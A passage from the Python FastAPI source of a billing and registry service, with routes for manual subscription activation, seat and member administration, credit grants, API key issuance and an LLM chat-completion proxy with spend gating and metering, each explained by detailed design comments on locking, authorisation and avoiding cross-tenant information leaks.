    non-active) subscription, and an org with no subscription row, activate.

    The 409 is a check-then-grant, so it is serialised by
    ``store.lock_org_activation`` — an org-keyed advisory lock taken as the first
    statement of this transaction, before the status read. Without it two
    concurrent activations of one fresh org would both pass the 409 and both
    grant (the append-only INSERTs have no conflict target); with it the second
    blocks, then reads ``active`` and 409s. The one-grant guarantee therefore
    holds under CONCURRENCY, not merely for a sequential repeat.

    ⚠️ Ships DARK: the Console deploys nowhere yet, and both the operator token
    and issuing it are OWNER-GATE (§8). This is the route existing, not running.
    """
    term = req.term_months or payments.SUBSCRIPTION_TERM_MONTHS
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)

        # Serialise the whole guard-then-grant on this org BEFORE the status
        # read (see the docstring's double-grant note). The seat/discount caps'
        # idiom one plane along: at READ COMMITTED two concurrent activations of
        # a fresh org would both read status≠'active', both pass the 409, and —
        # since `grant_seats`/`add_credit` are conflict-free INSERTs — both
        # grant. `FOR UPDATE` cannot help (a fresh org has no `org_subscription`
        # row to lock), so it must be an org-keyed advisory lock; it releases at
        # txn end. Taken here, not after the read, or the stale status is
        # already in hand.
        store.lock_org_activation(conn, org_id=org_id)

        plan = store.priced_plan(conn, plan_slug=req.plan_slug)
        if plan is None:
            raise HTTPException(
                status_code=400,
                detail=(
                    f"{req.plan_slug!r} is not an active plan; a manual "
                    "activation grants seats only on priced, active catalog rows"
                ),
            )

        # The double-grant guard (see the docstring). Read BEFORE any write, so
        # the refusal rolls nothing back.
        current = conn.execute(
            text("SELECT status FROM org_subscription "
                 "WHERE organization_id = :i"),
            {"i": org_id},
        ).scalar_one_or_none()
        if current == "active":
            raise HTTPException(
                status_code=409,
                detail={
                    "reason": "already_active",
                    "message": (
                        "organization already holds an active subscription; "
                        "adjust its seats or credits directly rather than "
                        "re-activating"
                    ),
                },
            )

        # Mirror `payments.fulfil`, minus the order: `provider='manual'`, NULL
        # provider ids (no provider was involved), the period from the database
        # clock.
        store.activate_subscription(
            conn, org_id=org_id, term_months=term, provider="manual",
            provider_customer_id=None, provider_subscription_id=None,
        )
        store.grant_seats(
            conn, org_id=org_id, plan_slug=req.plan_slug,
            quantity=req.seats, reason="manual",
        )
        if req.credits is not None:
            store.add_credit(
                conn, org_id=org_id, delta=req.credits,
                reason=LEDGER_REASON_MANUAL, ref=req.reference,
            )

        # Recorded as a manual staff grant. `control_audit` has no `reason`
        # column — actor/action/detail(JSONB) — so `reason='manual'` and the
        # operator's free-text `reference` ride in the detail, where the seat and
        # credit facts already sit.
        detail: dict[str, Any] = {
            "plan": req.plan_slug,
            "seats": req.seats,
            "term_months": term,
            "reason": "manual",
            "reference": req.reference,
        }
        if req.credits is not None:
            detail["credits"] = str(req.credits)
        _audit(conn, org_id, "subscription.activate_manual", detail,
               actor="operator")

        # Surface the result from the same view models the reads use — never a
        # recompute: the seat grid is `_seat_grid` (as `billing_summary`), the
        # balance is `balance_of(credit_deltas)`.
        sub = conn.execute(
            text(
                "SELECT status, provider, current_period_start, "
                "current_period_end FROM org_subscription "
                "WHERE organization_id = :i"
            ),
            {"i": org_id},
        ).one()
        seats = _seat_grid(conn, org_id)
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))

    return {
        "organization_id": org_id,
        "subscription": {
            "status": sub.status,
            "provider": sub.provider,
            "current_period_start": sub.current_period_start.isoformat(),
            "current_period_end": sub.current_period_end.isoformat(),
        },
        "seats": seats,
        "credit_balance": str(balance),
    }


@app.post("/billing/seats")
def assign_seat(req: SeatWriteRequest, _: Operator) -> dict[str, Any]:
    """Assign a seat on a plan. 409 at the cap, with a buy-more payload."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        state = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()
        if not capabilities_of(state).can_write_seats:
            raise HTTPException(
                status_code=403,
                detail=f"organization is {state}; seats are locked")

        identity_id = store.ensure_identity(conn, email=req.email)
        held = store.has_live_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug, identity_id=identity_id
        )
        grants, assigned = store.seat_rows(
            conn, org_id=org_id, plan_slug=req.plan_slug
        )
        decision = decide_assignment(
            seat_counts(req.plan_slug, grants, assigned),
            already_assigned=held,
            price_inr=store.plan_price(conn, plan_slug=req.plan_slug),
        )
        if not decision.allowed:
            raise HTTPException(
                status_code=decision.status,
                detail={"reason": decision.reason, "buy_more": decision.buy_more},
            )
        store.try_assign_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug,
            identity_id=identity_id, source=req.source,
        )
        _audit(conn, org_id, "seat.assign",
               {"email": req.email, "plan": req.plan_slug})

    return {"assigned": True, "plan_slug": req.plan_slug}


@app.post("/billing/seats/release")
def release_seat(req: SeatWriteRequest, _: Operator) -> dict[str, Any]:
    """Release a seat. Frees capacity immediately (D19.3)."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        identity_id = store.ensure_identity(conn, email=req.email)
        released = store.release_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug, identity_id=identity_id
        )
        _audit(conn, org_id, "seat.release",
               {"email": req.email, "plan": req.plan_slug, "released": released})

    return {"released": released}


# ── §6 item (h) — the customer-authenticated seat WRITE ─────────────────────
#
# The write-side twin of item (g)'s `GET /me/seats` read: an org's own admin
# assigning a purchased seat to a member of THEIR org, and releasing it. The
# only OTHER seat writes are the two Operator routes above — cross-org staff,
# taking an `org_slug` a customer must never name. These two are the missing
# self-serve door, on the deployment key's THIRD capability (`seat_admin`).
#
# ⚠️ **Why the deployment key and not the org key** (the crux, §6(h)): a
# `cc_live_` org key resolves to an `organization_id` and NOTHING else — it is
# *the org*, with no in-org member — so the Console cannot tell from it whether
# the caller is an admin, and R11 forbids fixing that with a body field. The
# deployment key is the one customer credential that resolves a MEMBER (via
# `store.deployment_visible_orgs`, the placement-bounded join sign-in already
# trusts), so the member's `org_membership.role` is reachable and the Console
# can authorise "admin, not any member" IN ITS OWN CODE. The chosen door is not
# an org-key route, so `test_no_org_key_route_writes_an_entitlement_or_ledger_row`
# stays green — and that green is the proof the org key gained no write.

#: A self-serve seat's billing category — never `core` (membership IS the Core
#: seat, D19.3). A customer naming any other value gets a 400 rather than a
#: CHECK-constraint 500 from `seat_assignment_source_chk`.
_SELF_SERVE_SEAT_SOURCES = frozenset({"center", "plan", "alacarte"})


#: The registry roles item (h)'s SEAT door demands of the acting member. A seat
#: costs money, so moving one is an owner/admin act in the Console's own
#: vocabulary — a plain member is refused HERE, not only by an upstream tier
#: (clause 3).
_SEAT_ADMIN_ROLES: frozenset[str] = frozenset({"owner", "admin"})

#: The registry roles CP-2f's MEMBER door demands: **any** of them, and this is a
#: narrower claim than the seat door's, taken deliberately and for a measured
#: reason. An ``owner|admin`` gate here would silently re-open the exact funnel
#: CP-2f closes: the tenant plane's second admin is a Console ``member`` (nothing
#: maps tenant ``org_role`` slugs onto the registry's role, D12), so an
#: ``owner|admin`` gate would 403 THEIR invites — best-effort, so nothing
#: surfaces — and every colleague they invited would resolve ``console-empty``
#: into an org of their own. The authorising gate for *"may this person add
#: members"* is the tenant plane's ``admin:members:invite``; the Console's
#: contribution is placement∩membership plus the ``status`` check below.
_MEMBER_ADMIN_ROLES: frozenset[str] = frozenset({"owner", "admin", "member"})


def _admin_scheme_context(
    conn,
    req: AdminSchemeRequest,
    caller: DeploymentCaller | None,
    *,
    roles: frozenset[str],
) -> tuple[str, str]:
    """Resolve ``(org_id, actor)`` for a customer-admin write — clauses 2-3.

    One door, two schemes, and the CREDENTIAL — never the body — chooses which,
    exactly as resolve/provision do:

    * **Deployment key** (``caller is not None``): the org and the acting admin
      are DERIVED TOGETHER from ``deployment_visible_orgs(deployment_id,
      actor_email)`` — placement∩membership, never a body field (R11). It must
      resolve to EXACTLY ONE admissible org or the write refuses (the chooser is
      a named non-goal, as at resolve). The acting member's registry
      ``role``/``status`` is then read on the RESOLVED ``(org, identity)``; the
      status must be ``active`` and the role must be in *roles*.
    * **Operator** (``caller is None``): a cross-org staff act that NAMES the org,
      as ``POST /billing/seats`` does. No actor, no role gate.

    ⚠️ *roles* is a **required keyword**, and that is the point of this signature:
    the derivation is ONE seam shared by the seat door and the member door, while
    **which roles a door demands is written at the door** — the same rule this
    service already applies to capabilities. A default here would silently give a
    new door whichever policy happened to be written first.
    """
    if caller is not None:
        return _admin_scheme_for_deployment(conn, req, caller, roles=roles)
    return _admin_scheme_for_operator(conn, req)


def _admin_scheme_for_deployment(
    conn,
    req: AdminSchemeRequest,
    caller: DeploymentCaller,
    *,
    roles: frozenset[str],
) -> tuple[str, str]:
    """The deployment-key arm: derive org+actor and gate on the registry role."""
    if req.org_slug is not None:
        # 400, never ignored — an ignored field is a caller who believes it named
        # its tenant. The org is the ANSWER here, derived below (R11).
        raise HTTPException(
            status_code=400,
            detail=(
                "a deployment key may not name an organization; the org is "
                "derived from membership and placement"
            ),
        )
    if not req.actor_email:
        raise HTTPException(
            status_code=400,
            detail="actor_email is required under the deployment-key scheme",
        )

    visible = store.deployment_visible_orgs(
        conn, deployment_id=caller.deployment_id, email=req.actor_email
    )
    admissible = [
        o for o in visible if capabilities_of(o["status"]).can_sign_in
    ]
    if not admissible:
        # The placement bound: a key placed for A resolves only A's members, so
        # naming a member of another deployment's org lands here. One 403,
        # byte-identical whether the actor is unknown, a member only on another
        # deployment, or a member of a `deleted` org — a distinguishable
        # negative would be a cross-org existence oracle (CP-2b clause 5).
        raise HTTPException(
            status_code=403,
            detail="the acting member is not an admin on this deployment",
        )
    if len(admissible) > 1:
        # More than one visible org → the org cannot be inferred, and choosing
        # among them is the chooser, a named non-goal (as at resolve).
        raise HTTPException(
            status_code=409,
            detail=(
                "the acting member belongs to more than one organization on "
                "this deployment; the organization cannot be inferred"
            ),
        )

    org = admissible[0]
    org_id = org["organization_id"]
    actor_identity_id = org["identity_id"]

    # Clause 3 — the acting member's registry role, on the RESOLVED (org,
    # identity). `deployment_visible_orgs` returns NEITHER role nor status
    # (its join does not consult them), so this is an added read — the
    # precedent is the resolve path's own `SELECT role, status FROM
    # org_membership`. `org_membership.role` is registry/billing vocabulary
    # (D12), and gating a BILLING write on it is using it for its stated
    # purpose, not inventing a second grant vocabulary.
    #
    # ⚠️ The `status == 'active'` half is the SAME for every door and is written
    # once, here: an actor who is themselves `invited`, `suspended` or `removed`
    # acts for nobody. Only the ROLE set varies, and it varies at the door.
    membership = conn.execute(
        text(
            "SELECT role, status FROM org_membership "
            "WHERE organization_id = :org AND user_identity_id = :i"
        ),
        {"org": org_id, "i": actor_identity_id},
    ).first()
    if (
        membership is None
        or membership[0] not in roles
        or membership[1] != "active"
    ):
        raise HTTPException(
            status_code=403,
            detail="the acting member is not an active admin of this organization",
        )
    return org_id, req.actor_email


def _admin_scheme_for_operator(conn, req: AdminSchemeRequest) -> tuple[str, str]:
    """The operator arm: a cross-org staff act that NAMES the org."""
    if req.actor_email is not None:
        # The operator has no actor — an `actor_email` under this scheme is a
        # caller who believes the write is acting-as someone, which is not a
        # thing here. 400 rather than ignored, the same rule the deployment arm
        # applies to `org_slug`.
        raise HTTPException(
            status_code=400,
            detail="actor_email is not used under the operator scheme; name the org",
        )
    if req.org_slug is None:
        raise HTTPException(
            status_code=400,
            detail="org_slug is required under the operator scheme",
        )
    return _org_id(conn, req.org_slug), "operator"


def _seat_admin_target(conn, *, org_id: str, member_email: str) -> str:
    """The target's identity IFF they hold a membership in ``org_id``.

    ⚠️ **Never mints.** Unlike the operator ``assign_seat``, which
    ``ensure_identity``-creates a global identity for any typed-in email, the
    self-serve door REFUSES an unknown or cross-org target (clause 4): a
    customer admin must not be able to mint arbitrary identities or write into a
    membership their org does not hold. ``user_identity.email`` is ``CITEXT``
    (001:110), so the match is case-insensitive without a ``lower()``.
    """
    row = conn.execute(
        text(
            """
            SELECT ui.id FROM user_identity ui
            JOIN org_membership m ON m.user_identity_id = ui.id
            WHERE ui.email = :email AND m.organization_id = :org
            """
        ),
        {"email": member_email, "org": org_id},
    ).first()
    if row is None:
        raise HTTPException(
            status_code=404,
            detail="no such member in this organization",
        )
    return str(row[0])


@app.post("/registry/seats")
def assign_seat_admin(
    req: SeatAdminRequest, caller: SeatAdminCaller
) -> dict[str, Any]:
    """Assign a seat under the customer's own admin credential (§6 item (h)).

    Reuses the OPERATOR ``assign_seat`` composition verbatim
    (``seat_rows`` → ``seat_counts`` → ``decide_assignment`` →
    ``try_assign_seat``) — NOT a fork, so the counts after a write reconcile with
    ``GET /me/seats`` (the same ``seat_rows``/``seat_counts``). What differs is
    the door: org and actor are DERIVED from the credential
    (``_admin_scheme_context`` with ``_SEAT_ADMIN_ROLES``), the target is
    validated against membership rather than minted,
    and this writer takes ``lock_seat_capacity`` BEFORE the count — closing the
    race the operator twin still carries.

    **Refuses at the cap (no self-serve oversubscription):** ``available == 0``
    and not already-assigned → 409 with the ``buy_more`` payload, byte-compatible
    with ``POST /billing/seats``; the customer buys more seats first, and
    oversubscription stays the Operator-only escape hatch. **Idempotent:** an
    already-assigned member is a 200 that consumes nothing (``decide_assignment``
    ``already_assigned`` + ``try_assign_seat``'s ``ON CONFLICT DO NOTHING``).
    Gated on ``can_write_seats`` (403 for ``suspended``/``cancelled``).
    """
    if req.plan_slug == CORE_PLAN_SLUG:
        raise HTTPException(
            status_code=400,
            detail="the Core seat is membership itself and is not assigned here",
        )
    if req.source not in _SELF_SERVE_SEAT_SOURCES:
        raise HTTPException(
            status_code=400,
            detail=(
                f"{req.source!r} is not a self-serve seat source; expected one "
                f"of {sorted(_SELF_SERVE_SEAT_SOURCES)}"
            ),
        )
    with get_engine().begin() as conn:
        org_id, actor = _admin_scheme_context(
            conn, req, caller, roles=_SEAT_ADMIN_ROLES
        )
        target_id = _seat_admin_target(
            conn, org_id=org_id, member_email=req.member_email
        )

        state = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()
        if not capabilities_of(state).can_write_seats:
            raise HTTPException(
                status_code=403,
                detail=f"organization is {state}; seats are locked",
            )

        # BEFORE the count — this new writer takes the advisory lock the operator
        # `assign_seat` twin still does not (store.lock_seat_capacity's note).
        store.lock_seat_capacity(conn, org_id=org_id, plan_slug=req.plan_slug)
        held = store.has_live_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug, identity_id=target_id
        )
        grants, assigned = store.seat_rows(
            conn, org_id=org_id, plan_slug=req.plan_slug
        )
        decision = decide_assignment(
            seat_counts(req.plan_slug, grants, assigned),
            already_assigned=held,
            price_inr=store.plan_price(conn, plan_slug=req.plan_slug),
        )
        if not decision.allowed:
            raise HTTPException(
                status_code=decision.status,
                detail={"reason": decision.reason, "buy_more": decision.buy_more},
            )
        store.try_assign_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug,
            identity_id=target_id, source=req.source,
        )
        _audit(conn, org_id, "seat.assign",
               {"email": req.member_email, "plan": req.plan_slug}, actor=actor)

    return {"assigned": True, "plan_slug": req.plan_slug}


@app.post("/registry/seats/release")
def release_seat_admin(
    req: SeatAdminRequest, caller: SeatAdminCaller
) -> dict[str, Any]:
    """Release a seat under the customer's own admin credential (§6 item (h)).

    Frees capacity immediately (D19.3), and **ungated** — freeing a seat is safe
    when the org is suspended, matching the operator twin. A release of a member
    who holds no live seat is a 200 no-op ``{released: false}``. Refuses
    ``plan_slug='core'`` (membership IS the Core seat, not released here).
    """
    if req.plan_slug == CORE_PLAN_SLUG:
        raise HTTPException(
            status_code=400,
            detail="the Core seat is membership itself and is not released here",
        )
    with get_engine().begin() as conn:
        org_id, actor = _admin_scheme_context(
            conn, req, caller, roles=_SEAT_ADMIN_ROLES
        )
        target_id = _seat_admin_target(
            conn, org_id=org_id, member_email=req.member_email
        )
        released = store.release_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug, identity_id=target_id
        )
        _audit(conn, org_id, "seat.release",
               {"email": req.member_email, "plan": req.plan_slug,
                "released": released}, actor=actor)

    return {"released": released}


# ── CP-2f · the member-write door ───────────────────────────────────────────
#
# The gap this closes, measured rather than assumed: until 2026-08-24
# `POST /orgs/provision`'s founder INSERT was the ONLY membership writer in this
# service. So a colleague INVITED through the tenant plane never reached the
# registry, and three things followed — they were invisible to `GET /me/members`
# (§6 item (i) reads `org_membership`), `_seat_admin_target` 404'd them so no seat
# could be assigned, and, worst, `store.deployment_visible_orgs` returned nothing
# for them, so `_resolve_for_deployment` answered `{"organizations": []}` and the
# box's self-serve funnel offered to create them an organization OF THEIR OWN.
# An invite, correctly performed, produced a second tenant. See CP-2f / D50.2.

@app.post("/registry/members")
def add_member_admin(
    req: MemberAdminRequest, caller: MemberAdminCaller
) -> dict[str, Any]:
    """Add a member under the customer's own admin credential (CP-2f, D50.2).

    The **exact sibling of** ``POST /registry/seats``: the same
    ``deployment_or_operator`` factory, the same two-arm shape, the same
    "the credential chooses the scheme" rule, and the SAME derivation seam
    (:func:`_admin_scheme_context`). What differs is the capability it demands
    (``member_admin`` — see :data:`auth.MEMBER_ADMIN_CAPABILITY` for why this is
    not a reuse of ``seat_admin``) and the role set the door accepts
    (:data:`_MEMBER_ADMIN_ROLES` — any ACTIVE member, and the reason is written
    at that constant).

    **The write is create-only and mints no role.** ``store.add_invited_member``
    inserts ``status='invited'`` at the ``role`` column default and leaves an
    existing row untouched, so a re-invite neither demotes an ``active`` member
    nor resurrects a ``removed`` one. The response says which happened —
    ``created`` plus the row's CURRENT ``status`` — because a silent 200 over a
    conflict is how two planes come to disagree without anybody noticing.

    **It allocates NO seat.** A membership row is not a seat: Core-seat burn stays
    at first resolve (D19.3 / D32.5, :func:`_allocate_core_seat`). What the row
    buys is that the seats grid can SEE the person and a paid seat can be assigned
    to them before their first sign-in.

    **Unlike the seat door, this one MINTS the identity.** ``ensure_identity`` is
    the same global upsert ``provision`` and ``resolve`` use (``user_identity.
    email`` is ``CITEXT``, so case is not a second human). That asymmetry with
    ``_seat_admin_target`` — which deliberately never mints — is exactly why the
    two doors take different capabilities: this is the door that makes a member
    exist, and it is gated on the lifecycle's ``can_write_seats``, so a
    ``suspended`` or ``cancelled`` organization cannot grow.
    """
    with get_engine().begin() as conn:
        org_id, actor = _admin_scheme_context(
            conn, req, caller, roles=_MEMBER_ADMIN_ROLES
        )

        # The same lifecycle question the seat write asks, and for the same
        # reason: growing an organization is a write, and a `suspended` or
        # `cancelled` customer's account must not grow. `deleted` never reaches
        # here — `can_sign_in` already excluded it in the derivation above.
        state = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()
        if not capabilities_of(state).can_write_seats:
            raise HTTPException(
                status_code=403,
                detail=f"organization is {state}; membership is locked",
            )

        identity_id = store.ensure_identity(
            conn, email=req.member_email, display_name=req.display_name
        )
        created, status_now = store.add_invited_member(
            conn, org_id=org_id, identity_id=identity_id
        )
        # Audited on BOTH paths, and the payload says which — a re-invite that
        # changed nothing is a real event an operator may need to see beside the
        # one that did.
        _audit(conn, org_id, "member.add",
               {"email": req.member_email, "created": created,
                "status": status_now}, actor=actor)

    return {"created": created, "status": status_now}


@app.post("/credits/grant")
def grant_credits(req: CreditGrantRequest, _: Operator) -> dict[str, Any]:
    """Add credits. Append-only — a correction is another row, never an edit."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        store.add_credit(
            conn, org_id=org_id, delta=req.credits,
            reason=req.reason, ref=req.ref,
        )
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))
        _audit(conn, org_id, "credits.grant",
               {"delta": str(req.credits), "reason": req.reason})

    return {"balance": str(balance)}


@app.get("/credits/balance")
def credit_balance(org_slug: str, _: Operator) -> dict[str, Any]:
    with get_engine().begin() as conn:
        org_id = _org_id(conn, org_slug)
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))
        status = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()

    decision = decide_spend(
        balance, Decimal(0),
        policy=OverdraftPolicy(),
        is_trial=(status == "trial"),
    )
    return {
        "balance": str(balance),
        "in_overdraft": decision.in_overdraft,
        "org_status": status,
    }


@app.post("/keys")
def issue_key(req: IssueKeyRequest, _: Operator) -> dict[str, Any]:
    """Mint an organization key. **The token is returned exactly once.**

    Only the hash is stored, so this response is the only moment the secret
    exists anywhere. It is not recoverable — a lost key is replaced, not looked
    up, and that is the property that makes a database disclosure survivable.
    """
    minted = mint_key()
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        store.issue_key(
            conn, org_id=org_id, prefix=minted.prefix,
            key_hash=minted.key_hash, label=req.label, created_by="operator",
        )
        # The audit row records the PREFIX, never the token.
        _audit(conn, org_id, "key.issue",
               {"prefix": minted.prefix, "label": req.label})

    return {"prefix": minted.prefix, "token": minted.token}


@app.post("/keys/revoke")
def revoke_key(req: RevokeKeyRequest, _: Operator) -> dict[str, Any]:
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        revoked = store.revoke_key(conn, org_id=org_id, prefix=req.prefix)
        _audit(conn, org_id, "key.revoke",
               {"prefix": req.prefix, "revoked": revoked})
    return {"revoked": revoked}


@app.get("/keys")
def list_keys(org_slug: str, _: Operator) -> dict[str, Any]:
    """Key metadata for one org. Never returns a hash or a token."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, org_slug)
        return {"keys": store.list_keys(conn, org_id=org_id)}


@app.get("/me")
def whoami(caller: KeyCaller) -> dict[str, Any]:
    """Who this key belongs to, and what it has left. **Read-only.**

    This is the whole of the organization key's surface on the Customer Console.
    It resolves the tenant from the credential (CP-3's actual point) and reports
    the balance the caller needs to render an out-of-credits state — without
    handing the metered party any way to move its own ledger.
    """
    org_id = caller.organization_id
    with get_engine().begin() as conn:
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))
        status = conn.execute(
            text("SELECT slug, status FROM organization WHERE id = :i"),
            {"i": org_id},
        ).first()

    return {
        "organization_id": org_id,
        "slug": status[0],
        "status": status[1],
        "credit_balance": str(balance),
        "key_prefix": caller.key_prefix,
    }


@app.post("/v1/chat/completions")
def chat_completions(req: CompletionRequest, caller: KeyCaller) -> Any:
    """Proxy one completion, gate it, and charge it.

    The organization comes from the API key, the model comes from the tier
    binding, and the usage row is written here — on our infrastructure, from
    numbers we observed — rather than reported by the party being metered.

    **CP-6 added two refusals and one charge.** Before the provider call, the
    balance gate (402 with a top-up payload) and the per-run circuit breaker
    (403) may refuse; after it, the completion is rated against the rate card in
    force and the cost is drawn from the ledger. The refusals are behind
    ``CUSTOMER_CONSOLE_SPEND_GATE`` and ship OFF; the charge is always computed
    and is **zero until the rate card is priced**, which is the owner's
    commercial act (§8). The order is the point: a gate after the provider call
    would refuse a request we had already paid for.

    Declared ``def``, not ``async def``: the engine is synchronous, so an async
    route would block the event loop for two round trips on what is by design
    the highest-QPS endpoint on the plane. CP-4 shipped it async and contradicted
    both this module's and ``db.py``'s own docstrings; the provider call is
    driven through ``asyncio.run`` inside the threadpool worker instead.
    """
    org_id = caller.organization_id

    if req.stream:
        # 501, not a 500. CP-4 forwarded `stream` and returned litellm's
        # CustomStreamWrapper to FastAPI, which failed to serialise it — the
        # client got "Internal Server Error" AND a phantom zero-token usage row
        # was committed for a completion nobody received. Refusing explicitly is
        # honest; the streaming path is CP-4b and is the half that matters most,
        # since every agent runtime streams through this choke point.
        raise HTTPException(
            status_code=501,
            detail="streaming is not implemented on the Router yet (CP-4b)",
        )

    with get_engine().begin() as conn:
        try:
            resolved = resolve_tier(conn, req.model)
        except TierUnknown:
            # 400, not a silent coercion to a default. A misconfigured agent
            # must be visible rather than quietly billed (D32.7).
            raise HTTPException(
                status_code=400,
                detail=f"unknown tier {req.model!r}; name a tier, not a model",
            )
        provider = resolved.model.split("/", 1)[0]
        try:
            credential = provider_credential(conn, provider=provider, org_id=org_id)
        except Exception:
            # A missing or rotated encryption key must fail CLOSED with the same
            # 503 shape the other secrets use — not a 500 that reads as a bug.
            _log.exception("router.credential_unavailable")
            raise HTTPException(
                status_code=503, detail="provider credentials unavailable")

        # CP-6. BEFORE the provider call, which is the only place a refusal is
        # worth anything: after it we have already spent the money. Metering
        # afterwards stays best-effort and never fails a completion — the GATE
        # may refuse, the METER may not.
        refusal = _spend_refusal(conn, caller) if _spend_gate_enabled() else None

    if refusal is not None:
        raise refusal

    if credential is None:
        raise HTTPException(
            status_code=503,
            detail=f"no provider credential configured for {provider!r}",
        )
    secret, api_base = credential

    # ALLOWLIST. Only named parameters reach the provider, and the ones that
    # multiply our cost are clamped. `api_base` is ours alone — a caller can
    # neither set it nor see it.
    passthrough = {
        k: v for k, v in req.model_dump(exclude_none=True).items()
        if k in _FORWARDABLE
    }
    requested_max = passthrough.get("max_tokens")
    passthrough["max_tokens"] = min(
        int(requested_max) if requested_max else _MAX_OUTPUT_TOKENS,
        _MAX_OUTPUT_TOKENS,
    )
    call_kwargs: dict[str, Any] = {
        **passthrough,
        "model": resolved.model,
        "api_key": secret,
        # Bounded explicitly rather than left to litellm's defaults, so one
        # request cannot become fifty provider calls.
        "num_retries": 1,
        "timeout": 120,
    }
    if api_base:
        call_kwargs["api_base"] = api_base

    try:
        response = asyncio.run(call_provider(**call_kwargs))
    except HTTPException:
        raise
    except Exception as exc:
        # Map upstream failures to something a caller can branch on. Without
        # this a provider 429 is indistinguishable from a Router bug and every
        # client treats both as fatal (or both as retryable). The message is
        # deliberately NOT echoed: it can carry the request, and the request can
        # carry customer content.
        status = getattr(exc, "status_code", None)
        _log.warning("router.provider_error", extra={"upstream_status": status})
        if isinstance(status, int) and 400 <= status < 600:
            raise HTTPException(
                status_code=502 if status >= 500 else status,
                detail="upstream provider error",
            )
        raise HTTPException(status_code=502, detail="upstream provider error")

    # Metering is best-effort and NEVER fails the call: an unmetered completion
    # is a revenue problem, a failed completion is a product problem, and the
    # product problem is worse. It runs only AFTER a successful provider call,
    # so a failed request can no longer leave a phantom row behind.
    try:
        usage = usage_from_response(response)
        with get_engine().begin() as conn:
            # CP-6: the draw. `record_usage` negates this into `credit_ledger`
            # in the SAME transaction as the usage row, so a retried write that
            # inserts nothing also charges nothing. Zero while the card is
            # unpriced, which is the shipped state until the owner prices it.
            billed = _rate_completion(conn, model=resolved.model, usage=usage)
            store.record_usage(
                conn, org_id=org_id,
                # SERVER-generated. The caller's id is correlation only — see
                # migration 005 and CompletionRequest.client_ref.
                request_id=f"rtr-{uuid.uuid4().hex}",
                client_ref=req.client_ref,
                billed_credits=billed,
                user_email=caller.member, agent=caller.agent,
                module_slug=caller.module_slug, run_id=caller.run_id,
                model=resolved.model, tier=resolved.tier,
                prompt_tokens=usage.prompt_tokens,
                completion_tokens=usage.completion_tokens,
                cached_tokens=usage.cached_tokens,
            )
    except Exception:
        _log.exception("router.metering_failed")

    return response


@app.get("/me/billing")
def my_billing(caller: KeyCaller) -> dict[str, Any]:
    """The calling organization's OWN billing summary. Read-only.

    Exists because the customer's billing page needs this data and the
    workbench must **not** hold the operator token — a tenant deployment
    holding a cross-organization credential is the whole thing D32/D35 are
    arranged to avoid. So the deployment presents its own key, and the key
    resolves the organization (CP-3). It can read its own billing and nothing
    else, by construction rather than by a `WHERE` clause somebody has to
    remember.

    Balance is `SUM(credit_ledger)` computed here, once. The browser renders it
    and never recomputes it.
    """
    org_id = caller.organization_id
    with get_engine().begin() as conn:
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))

        # Burn over a NAMED window, so the UI can say what it is measuring.
        # A figure whose window is unstated reads as authoritative and is not.
        window_days = 30
        burn = conn.execute(
            text(
                "SELECT COALESCE(SUM(billed_credits), 0) FROM usage_event "
                "WHERE organization_id = :o "
                "  AND created_at >= now() - make_interval(days => :d)"
            ),
            {"o": org_id, "d": window_days},
        ).scalar_one()

        # BYOK: metered, never charged for tokens (§3.4). Presence of the org's
        # own provider credential is what makes it true — not a flag somebody
        # sets separately and forgets to clear.
        is_byok = bool(conn.execute(
            text("SELECT 1 FROM provider_credential "
                 "WHERE organization_id = :o AND revoked_at IS NULL LIMIT 1"),
            {"o": org_id},
        ).first())

    return {
        "credits": {
            "balanceCredits": float(balance),
            "burnThisCycle": float(burn),
            "windowDays": window_days,
            "isByok": is_byok,
        },
        # SC-5 issues real documents; until an invoice exists there is nothing
        # to list, and an empty list is the honest answer rather than a stub.
        "invoices": [],
        # Self-serve checkout is SC-4a and deliberately sequenced after
        # metering (D37.1). The page renders a contact prompt, not a dead
        # button, while this is false.
        "purchaseEnabled": False,
    }


# ══ CP-9 · the checkout: orders, redemption, and the money guard ════════════
#
# **The auth answer, in one paragraph, because it is the question the audit
# stopped on.** There is NO fifth scheme. The organization key — read-only for
# every route that shipped before this one — gains exactly two writes, chosen
# because neither can move value by itself: creating a pending intent, and
# PRESENTING a discount code somebody holding `Operator` issued. Value moves on
# exactly two events, both carrying an authority the caller does not hold: a
# provider webhook whose signature verifies, or the redemption of a valid
# operator-issued code. The reads below (§9.3a) sit on a credential that
# already reads, so they mint nothing.

#: How long an unpaid order stays open. `abandoned` is written by EXPIRY, never
#: by the customer (§9.2) — and expiry is observed at the next write that
#: touches the order, because the operator-facing sweep belongs with CP-8's
#: console rather than with a scheduler that has nowhere to report.
_ORDER_TTL_MINUTES = 30

#: A NAMED page size, never an unbounded `SELECT *` on a table a customer can
#: grow without limit (9.3(6)'s named residual is exactly that).
_ORDER_PAGE_SIZE = 50

#: ONE refusal shape for "that order belongs to another organization" and "no
#: such order" — same status, same body bytes, naming nothing (§9.3(7)). A
#: 403-for-foreign / 404-for-unknown split is a membership oracle over other
#: tenants' order ids. Contrast `_org_id`'s 404, which names the slug on
#: purpose: the operator is cross-org BY DESIGN, and that is the contrast, not
#: the precedent.
_NO_SUCH_ORDER = "no such order"

